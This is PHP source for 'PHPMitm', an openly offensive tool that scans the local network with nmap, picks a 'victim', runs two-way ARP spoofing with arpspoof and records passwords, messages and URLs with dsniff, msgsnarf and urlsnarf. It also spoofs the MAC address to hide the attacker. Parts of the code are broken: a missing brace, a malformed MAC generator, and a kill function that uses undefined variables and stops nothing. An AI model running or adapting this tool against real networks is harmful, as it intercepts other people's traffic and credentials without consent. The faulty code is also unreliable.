<?php

/**
 * Description of PHPMitm
 *
 * @author Tony Baltazar <root@rubyninja.org>
 */
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA



#require_once './PHPMitmDaemon.php';
require_once './PHPMitm_Exception.php';


class PHPMitm {

    const MESSAGE = "\nPlease be patient, nmap is kindly scanning your network.\n\nThis may take 1-2 minutes...\n\n";

    /**
     * @var boolean
     */
    protected $_nmap;

    /**
     * @var boolean
     */
    protected $_nmap_decides;

    /**
     * @var string
     */
    protected $_target_machine;

    /**
     * @var string
     */
    protected $_interface;

    /**
     * @var string
     */
    protected $_output_dir;

    /**
     * @var string
     */
    private $_network_range = '2-254';

    /**
     * @var string
     */
    private $_default_gateway;

    /**
     * @var float
     */
    private $_timer;
    

    /**
     * Constructor
     *
     * @param string $interface
     * @param boolean  $nmap_decides
     * @param string $output_dir
     */
    public function  __construct($interface, $nmap_decides=FALSE, $output_dir=NULL) {
        $this->_interface = $interface;
        $this->_nmap_decides = $nmap_decides;
        $this->_timer = time();

        ($output_dir == NULL) ? $this->_output_dir = getenv('HOME') . '/phpmitm_output' : $this->_output_dir = $output_dir;

    }

    /**
     * Set's the default gateway (optional).
     *
     * @param string $gw
     */
    public function set_DefaultGateway($gw=NULL){
        ($gw == NULL) ? $this->_default_gateway = trim(shell_exec("route -vn |head |awk -F ' '  '$2 != \"0.0.0.0\" && $2 != \"IP\"  && $2 != \"Gateway\" {print $2}'")) : $this->_default_gateway = $gw;
    }

    /**
     * Specifies your victim's IP address
     *
     * If the secondary construct value is true, it will override this method.
     *
     * @param string $target_machine
     */
    public function set_TargetMachine($target_machine){
        $this->_target_machine = $target_machine;
    }


    /**
     * Returns network interface.
     *
     * @return string
     */
    public function get_NetworkInterface(){
        return $this->_interface;
    }

    /**
     * Returns your victim's IP address.
     *
     * @return string
     */
    public function get_TargetMachine(){
        return $this->_target_machine;
    }

    /**
     * Return's default gateway.
     *
     * @return string
     */
    public function get_DefaultGateway(){
        return $this->_default_gateway;
    }

    /**
     * Returns directory were all man-in-the-middle traffic is saved too.
     *
     * @return string
     */
    public function get_OutputDir(){
        return $this->_output_dir;
    }

    
    /**
     * Checks if dsniff/nmap are installed on the attacking machine.
     *
     * @return boolean
     */
    public function sanity_checks() {
	$nmap = explode(" ", shell_exec('whereis nmap'));

	$dsniff_check = explode(" ", shell_exec('whereis dsniff'));

	if (count($dsniff_check) == 1){
            throw new PHPMitm_Exception("Error: dsniff is not installed on this system!\n" . "run apt-get install dsniff or visit http://packages.sw.be/dsniff/ \n\n\n");
	}

	if(count($nmap) != 1) {
            return $this->_nmap = $nmap[1];
	} else {
            throw new PHPMitm_Exception("Unable to run automated nmap scan, nmap is not installed.\n");
        }

    }

    /**
     * Gets user input.
     *
     * @return string
     */
    private function stdin($msg) {
        # This is why I love Ruby :-|
        $stdin = fopen('/dev/stdin', 'r');
        echo $msg;
        $input = fgets($stdin);
        fclose($stdin);

        return trim($input);
    }

    /**
     * Randomize NIC (optional).
     * 
     */
    public function randomize_nic() {   
	exec("iwconfig 2> /dev/null", $wlan_arr);
        if (count($wlan_arr) > 0) {
            echo "WARNING: your network interface card's mac address is not being changed because you're on wifi.\n";
        } else {
            # Blame it on an Apple computer.
            $hw = array('00:1c:b3','00:1e:c2','00:1f:5b','00:1f:f3','00:21:e9','00:22:41','00:23:12','00:23:32','00:23:6c','00:23:df',
                '00:24:36','00:25:00','00:25:4b','00:25:bc','00:26:08','00:26:4a','00:26:b0','00:26:bb','04:0c:ce','04:1e:64',
                '10:93:e9','14:5a:05','24:ab:81','28:e7:cf','34:15:9e','40:30:04','40:d3:2d','44:2a:60','58:1f:aa','58:b0:35',
                '60:fb:42','64:b9:e8','7c:6d:62','8c:58:77','90:84:0d','98:03:d8','a4:b1:97','a4:d1:d2','d4:9a:20','d8:30:62','d8:9e:3f','f8:1e:df');
            
            $mac_chars = array_merge(range(0, 9), range('a', 'f'));
            
            $mac_address_prefix = array_rand($hw, 1) . ':' . array_rand($mac_chars, 4) . ':' . array_rand($mac_chars, 4);
            system('ifconfig ' . self::get_NetworkInterface() . ' down hw ether ' . $mac_address_prefix);
            system('ifconfig ' . self::get_NetworkInterface() . ' up');
	
        }
    

    public function initial_attack_prep() {
        if ($this->_nmap_decides) {
            $lucky_host = array(); // gather IP's of hosts found on network

            $host_ip = explode('.', shell_exec('ifconfig | grep -A 1 ' . self::get_NetworkInterface() . " | grep 'inet addr'| awk -F ' ' '{print $2}'| cut -d ':' -f2"));
            $host_ip[3] = $this->_network_range; //scan range
            $scan_hosts = implode('.', $host_ip);

            echo self::MESSAGE;

            exec("nmap -sP $scan_hosts", $scan_output);
            //print_r($scan_output);

            if (count($scan_output) == 4){
                throw new PHPMitm_Exception("No hosts found on this network range: $scan_hosts \n\n");
            }

            foreach($scan_output as $detected) {
                if (preg_match('/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/', $detected)) {
                    $lhost = explode(' ', $detected);
                    $lucky_host[] = $lhost[4];
                }
            }

            while(1) {
                $pwn_me = $lucky_host[array_rand($lucky_host)];
                $prompt = self::stdin('Scan ' . $pwn_me . ': [y/n] ' ."\n");
                if ($prompt == 'y' || $prompt == 'Y' || $prompt == 'Yes' || $prompt == 'yes') {
                    self::set_TargetMachine(trim($pwn_me));
                    break;
                }
            }
       } else {
            if (self::get_TargetMachine() == NULL){
                throw new PHPMitm_Exception("target system has not been specified, use method set_TargetMachine() to specify your victim's IP address.\n\n");
            }
            if (!preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', self::get_TargetMachine())){
                throw new PHPMitm_Exception('invalid target machine IP address: ' . self::get_TargetMachine() . "\n\n");
            }
        }


        # Enable packet forwarding on your attacking machine
        exec('echo "1" > /proc/sys/net/ipv4/ip_forward', $ip_forwar_out, $ip_forward_status);
        if($ip_forward_status != 0) {
            throw new PHPMitm_Exception("Unable to set host in forwarding mode. Are you root?\n");
        }

        exec('arpspoof -i ' . self::get_NetworkInterface() . ' -t ' . self::get_DefaultGateway() . ' ' . self::get_TargetMachine() . ' > /dev/null 2> /var/log/php_sniffer.log &', $arpspoof_out, $arpspoof_status);
        if($arpspoof_status != 0) {
            throw new PHPMitm_Exception("Unable to setup arpspoof. See /var/log/php_sniffer.log for details.\n");
        }

        # Enable the reverse arpspoof
        exec('arpspoof -i ' . self::get_NetworkInterface() . ' -t '. self::get_TargetMachine() . ' '. self::get_DefaultGateway() . '> /dev/null 2> /var/log/php_sniffer.log &', $reverse_arpspoof_out, $reverse_arpspoof_status);
        if($reverse_arpspoof_status != 0) {
            throw new PHPMitm_Exception("Unable to set reverse arpspoof. See /var/log/php_sniffer.log for details.\n");
        }
    }


    public function attack() {

        $iface = self::get_NetworkInterface();
        $dir = self::get_OutputDir();
        
        if(file_exists($dir)) {
            echo 'Dir exists' . "\n";           
        } else{
            mkdir("$dir");
            echo "Making dir: $dir \n";
        }

        #System_Daemon::start();
            exec("msgsnarf -i $iface >> $dir/php_mitm-msgsnarf.txt &");
            exec("urlsnarf -i $iface >> $dir/php_mitm-urlsnarf.txt &");
            exec("dsniff -i $iface >> $dir/php_mitm-dniff.txt &");
        #System_Daemon::stop();
        echo 'Nancy' . "\n";
    }

    /**
     * Stops all arpspoofing
     */
    private function kill_processes() {
        $arp_spoff_ps = shell_exec("ps aux | grep 'arpspoof -i $iface -t $default_gateway $target_machine' | awk -F ' ' '{print $2}'");
        $reverse_arp_spoff_ps = shell_exec("ps aux | grep 'arpspoof -i $iface eth1 -t $target_machine $default_gateway' | awk -F ' ' '{print $2}'");
    }

}



?>
